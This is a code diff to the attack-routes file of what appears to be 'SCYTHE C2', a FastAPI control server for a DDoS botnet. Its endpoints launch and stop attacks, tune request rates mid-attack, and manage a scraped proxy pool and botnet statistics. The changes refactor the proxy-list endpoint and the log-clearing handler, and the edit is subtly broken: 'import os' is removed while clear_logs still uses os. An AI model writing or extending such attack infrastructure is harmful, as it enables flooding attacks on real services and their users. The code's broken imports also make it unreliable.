@@ -1,34 +1,14 @@
 """
 Attack routes for SCYTHE C2 — WITH ADMIN PANEL ENDPOINTS
-- POST /api/attack              → Launch a new attack (with proxy auto-attach)
-- POST /api/stop/{id}           → Stop a specific attack
-- POST /api/stopall             → Stop all active attacks
-- POST /api/attack/update-rps/{id} → Update RPS mid-attack
-- GET  /api/attack/active       → Get active attacks (for admin panel)
-- GET  /api/proxy/status        → Get proxy pool status
-- GET  /api/proxy/stats         → Get proxy stats (for admin panel)
-- GET  /api/proxy/list          → Get proxy list (for admin panel)
-- POST /api/proxy/refresh       → Force refresh proxy pool
-- POST /api/proxy/remove-dead   → Remove dead proxies
-- POST /api/proxy/scrap         → Scrap proxy from URLs
-- GET  /api/botnet/stats        → Get botnet stats (for admin panel)
-- GET  /api/config/concurrent   → Get max concurrent
-- POST /api/config/concurrent   → Set max concurrent
-- GET  /api/config/rps-limit    → Get RPS limit
-- POST /api/config/rps-limit    → Set RPS limit
-- POST /api/service/restart     → Restart service
-- POST /api/service/clear-logs  → Clear logs
-- HEAD /api/attack              → Health check
 """
 
+import asyncio
 from fastapi import APIRouter, Request, HTTPException, Response
 from fastapi.responses import JSONResponse
 from pydantic import BaseModel
 from typing import Optional, List
-import time
-import os
 
-from app.core.models import AttackRequest, AttackResponse, AttackStatus
+from app.core.models import AttackRequest, AttackResponse, AttackStatus, ProxyStats
 from app.core.logger import logger, log_attack_event
 from app.managers.proxy_manager import proxy_manager
 from app.managers.concurrent_manager import concurrent_manager
@@ -231,29 +211,29 @@ async def get_proxy_list(request: Request, alive: bool = True):
     try:
         if alive:
             proxies = await proxy_manager.get_alive_proxies()
+            # FIXED: ProxyItem now has protocol attribute
+            result = [{"ip": p.ip, "port": p.port, "protocol": p.protocol} for p in proxies]
         else:
-            # Get all proxies from pool
+            # Get all proxies from Redis hash
             from app.core.redis_client import get_redis
             redis = await get_redis()
             pool_key = proxy_manager.pool_key
             keys = await redis.hkeys(pool_key)
-            proxies = []
-            for key in keys[:500]:  # Limit to 500
-                proxy_json = await redis.hget(pool_key, key)
-                if proxy_json:
-                    import json
-                    p = json.loads(proxy_json)
-                    proxies.append({
-                        "ip": p.get("ip", ""),
-                        "port": p.get("port", 0),
-                        "protocol": p.get("protocol", "http"),
-                        "is_alive": p.get("is_alive", False),
-                        "speed_tier": p.get("speed_tier", "unknown"),
-                    })
+            result = []
+            for key in keys:
+                if ":" in key:
+                    # key format: protocol://ip:port
+                    if "://" in key:
+                        protocol, rest = key.split("://", 1)
+                        ip, port = rest.rsplit(":", 1)
+                        result.append({"ip": ip, "port": int(port), "protocol": protocol})
+                    else:
+                        ip, port = key.rsplit(":", 1)
+                        result.append({"ip": ip, "port": int(port), "protocol": "http"})
 
         return JSONResponse(content={
             "success": True,
-            "proxies": [{"ip": p.ip, "port": p.port, "protocol": p.protocol} for p in proxies] if alive else proxies
+            "proxies": result
         })
     except Exception as e:
         logger.error(f"Error getting proxy list: {e}")
@@ -406,8 +386,6 @@ async def set_rps_limit(request: Request, config: ConfigRequest):
 async def restart_service(request: Request):
     """Restart service (placeholder)."""
     try:
-        # In production, this would trigger a service restart
-        # For now, just log and return success
         logger.info("Service restart requested via admin panel")
         return JSONResponse(content={
             "success": True,
@@ -422,6 +400,7 @@ async def restart_service(request: Request):
 async def clear_logs(request: Request):
     """Clear system logs."""
     try:
+        import time
         log_file = "logs/scythe-c2.log"
         if os.path.exists(log_file):
             with open(log_file, "w") as f:
